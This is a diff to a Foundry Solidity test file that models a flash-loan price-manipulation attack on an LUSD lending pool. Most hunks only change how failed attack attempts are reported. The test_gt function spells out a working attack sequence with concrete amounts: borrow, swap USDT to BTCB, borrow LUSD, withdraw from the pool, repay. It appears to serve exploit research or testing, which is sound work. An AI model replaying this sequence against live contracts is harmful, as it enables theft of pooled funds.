@@ -313,7 +313,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_usdt_btcb(amt1, amt2);
         swap_pairub_attacker_btcb_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -331,7 +331,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_btcb_usdt(amt1, amt2);
         swap_pairub_attacker_usdt_btcb(amt3, amt4);
         payback_btcb_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -351,7 +351,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_loan_attacker_btcb_lusd(amt3, amt4);
         withdraw_lusdpool_lusd_usdt(amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -374,7 +374,7 @@ contract LUSDTest is Test, BlockLoader {
         withdraw_lusdpool_lusd_usdt(amt5);
         swap_pairub_attacker_btcb_usdt(amt6, amt7);
         payback_usdt_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -394,7 +394,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_usdt_btcb(amt2, amt3);
         swap_loan_attacker_btcb_lusd(amt4, amt5);
         payback_lusd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -414,7 +414,7 @@ contract LUSDTest is Test, BlockLoader {
         withdraw_lusdpool_lusd_usdt(amt3);
         swap_pairub_attacker_usdt_btcb(amt4, amt5);
         payback_btcb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -438,7 +438,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_usdt_btcb(amt5, amt6);
         swap_pairub_attacker_btcb_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -462,7 +462,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_btcb_usdt(amt5, amt6);
         swap_pairub_attacker_usdt_btcb(amt7, amt8);
         payback_btcb_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -488,7 +488,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_loan_attacker_btcb_lusd(amt7, amt8);
         withdraw_lusdpool_lusd_usdt(amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -514,7 +514,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_usdt_btcb(amt6, amt7);
         swap_pairub_attacker_btcb_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -540,7 +540,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_usdt_btcb(amt6, amt7);
         swap_loan_attacker_btcb_lusd(amt8, amt9);
         payback_lusd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -566,7 +566,7 @@ contract LUSDTest is Test, BlockLoader {
         withdraw_lusdpool_lusd_usdt(amt7);
         swap_pairub_attacker_usdt_btcb(amt8, amt9);
         payback_btcb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -592,7 +592,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_btcb_usdt(amt6, amt7);
         swap_pairub_attacker_usdt_btcb(amt8, amt9);
         payback_btcb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -620,7 +620,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_loan_attacker_btcb_lusd(amt8, amt9);
         withdraw_lusdpool_lusd_usdt(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -648,7 +648,7 @@ contract LUSDTest is Test, BlockLoader {
         swap_pairub_attacker_usdt_btcb(amt7, amt8);
         swap_loan_attacker_btcb_lusd(amt9, amt10);
         payback_lusd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -676,28 +676,40 @@ contract LUSDTest is Test, BlockLoader {
         withdraw_lusdpool_lusd_usdt(amt8);
         swap_pairub_attacker_usdt_btcb(amt9, amt10);
         payback_btcb_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 980925 * 1e18);
         borrow_usdt_owner(980925 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", (usdt.balanceOf(attacker) * 5) / 6);
+        emit log_named_uint("amt2", 1246953598313175025);
         swap_pairub_attacker_usdt_btcb(
             (usdt.balanceOf(attacker) * 5) / 6,
             1246953598313175025
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 1515366635982742);
+        emit log_named_uint("amt4", 10000 * 1e18);
         swap_loan_attacker_btcb_lusd(1515366635982742, 10000 * 1e18);
         printBalance("After step2 ");
+        emit log_named_uint("amt5", lusd.balanceOf(attacker));
         withdraw_lusdpool_lusd_usdt(lusd.balanceOf(attacker));
         printBalance("After step3 ");
+        emit log_named_uint("amt6", btcb.balanceOf(attacker));
+        emit log_named_uint(
+            "amt7",
+            pairub.getAmountOut(btcb.balanceOf(attacker), address(btcb))
+        );
         swap_pairub_attacker_btcb_usdt(
             btcb.balanceOf(attacker),
             pairub.getAmountOut(btcb.balanceOf(attacker), address(btcb))
         );
         printBalance("After step4 ");
+        emit log_named_uint("amt8", 980925 * 1e18);
         payback_usdt_owner(980925 * 1e18);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
@@ -723,7 +735,7 @@ contract LUSDTest is Test, BlockLoader {
         withdraw_lusdpool_lusd_usdt(amt5);
         swap_pairub_attacker_btcb_usdt(amt6, amt7);
         payback_usdt_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
